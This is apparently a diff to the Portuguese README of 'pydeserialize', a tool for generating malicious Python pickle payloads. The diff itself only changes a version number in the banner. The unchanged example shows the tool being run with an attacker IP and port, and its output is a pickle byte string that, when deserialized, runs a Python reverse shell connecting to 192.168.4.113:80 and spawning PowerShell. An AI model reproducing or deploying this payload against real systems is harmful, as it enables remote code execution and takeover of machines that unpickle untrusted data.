@@ -38,7 +38,7 @@ Isso exibirá a ajuda para a ferramenta. Aqui estão todos os switches que ele s
 | . | | | . | -_|_ -| -_|  _| | .'| | |- _| -_|
 |  _|_  |___|___|___|___|_| |_|__,|_|_|___|___|
 |_| |___|  
-     v0.0.1 - @joaoviictorti
+     v0.0.7 - @joaoviictorti
 
 options:
   -h, --help            show this help message and exit
@@ -66,7 +66,7 @@ pydeserialize -ip 192.168.4.113 -p 80 -o Windows -e shell
 | . | | | . | -_|_ -| -_|  _| | .'| | |- _| -_|
 |  _|_  |___|___|___|___|_| |_|__,|_|_|___|___|
 |_| |___|  
-     v0.0.1 - @joaoviictorti
+     v0.0.7 - @joaoviictorti
 
 b'\x80\x04\x95\xf9\x00\x00\x00\x00\x00\x00\x00\x8c\x02nt\x94\x8c\x06system\x94\x93\x94\x8c\xe1python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.4.113",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("powershell")\'\x94\x85\x94R\x94.'
 ```
